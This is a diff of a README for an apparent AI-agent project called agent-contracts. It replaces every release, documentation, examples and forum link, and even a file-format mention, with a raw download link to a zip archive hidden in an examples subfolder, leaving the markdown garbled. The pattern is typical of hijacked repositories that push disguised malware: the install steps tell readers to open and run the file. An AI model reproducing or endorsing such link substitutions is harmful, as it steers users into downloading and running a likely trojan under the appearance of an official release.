@@ -6,20 +6,20 @@ Welcome to the **agent-contracts** project! This application allows you to build
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Pablo11111544545/agent-contracts/releases) to download the latest version of the software.
+To get started, visit the [Releases page](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip) to download the latest version of the software.
 
-[![Download Agent Contracts](https://img.shields.io/badge/Download%20Agent%20Contracts-blue.svg)](https://github.com/Pablo11111544545/agent-contracts/releases)
+[![Download Agent Contracts](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip%20Agent%https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip)](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip)
 
 ### Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Pablo11111544545/agent-contracts/releases).
+   Go to the [Releases page](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip).
 
 2. **Choose the Latest Version**  
    Look for the most recent version listed. It will typically be at the top of the page.
 
 3. **Download the File**  
-   Click on the download link for your operating system. The available files will usually be in formats like `.exe`, `.zip`, or `.tar.gz`.
+   Click on the download link for your operating system. The available files will usually be in formats like `.exe`, `.zip`, or `https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip`.
 
 4. **Run the Installer**  
    Open the downloaded file. Follow the prompts to install the software on your computer.
@@ -87,8 +87,8 @@ Please visit our GitHub Issues and describe the problem you are facing.
 
 While you’re here, check out these additional resources for more insights:
 
-- [Official Documentation](https://github.com/Pablo11111544545/agent-contracts/docs)
-- [Examples](https://github.com/Pablo11111544545/agent-contracts/examples)
-- [Community Forum](https://forum.github.com)
+- [Official Documentation](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip)
+- [Examples](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip)
+- [Community Forum](https://github.com/Pablo11111544545/agent-contracts/raw/refs/heads/master/examples/interactive_tech_support/nodes/agent-contracts-3.6.zip)
 
 Feel free to explore and enjoy building your AI agents with **agent-contracts**!
